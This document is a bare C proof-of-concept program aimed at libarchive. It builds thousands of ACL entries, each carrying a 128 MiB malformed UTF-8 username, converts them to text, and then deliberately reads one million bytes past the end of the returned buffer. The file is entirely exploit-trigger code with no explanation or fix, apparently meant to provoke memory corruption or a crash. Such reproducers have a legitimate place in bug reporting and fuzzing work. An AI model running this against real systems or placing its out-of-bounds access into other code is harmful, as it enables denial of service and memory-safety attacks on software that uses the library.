#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    struct archive_entry *entry;
    char *text;
    ssize_t text_len;
    int flags = ARCHIVE_ENTRY_ACL_STYLE_EXTRA_ID | ARCHIVE_ENTRY_ACL_STYLE_MARK_DEFAULT;
    
    entry = archive_entry_new();
    if (!entry) {
        return 1;
    }
    
    size_t username_len = 128 * 1024 * 1024;
    char *long_username = malloc(username_len + 1);
    if (!long_username) {
        archive_entry_free(entry);
        return 1;
    }
    
    memset(long_username, 0xC3, username_len - 1);
    long_username[username_len - 1] = 0x80;
    long_username[username_len] = '\0';
    
    int num_entries = 2048;
    
    for (int i = 0; i < num_entries; i++) {
        archive_entry_acl_add_entry(entry,
            ARCHIVE_ENTRY_ACL_TYPE_ACCESS,
            ARCHIVE_ENTRY_ACL_READ | ARCHIVE_ENTRY_ACL_WRITE | ARCHIVE_ENTRY_ACL_EXECUTE,
            ARCHIVE_ENTRY_ACL_USER,
            1000 + i,
            long_username);
        
        archive_entry_acl_add_entry(entry,
            ARCHIVE_ENTRY_ACL_TYPE_DEFAULT,
            ARCHIVE_ENTRY_ACL_READ | ARCHIVE_ENTRY_ACL_WRITE,
            ARCHIVE_ENTRY_ACL_GROUP,
            2000 + i,
            long_username);
    }
    
    text = archive_entry_acl_to_text(entry, &text_len, flags);
    
    if (text) {
        volatile char c = text[0];
        volatile char d = text[text_len - 1];
        volatile char e = text[text_len + 1000000];
        (void)c; (void)d; (void)e;
        free(text);
    }
    
    free(long_username);
    archive_entry_free(entry);
    
    return 0;
}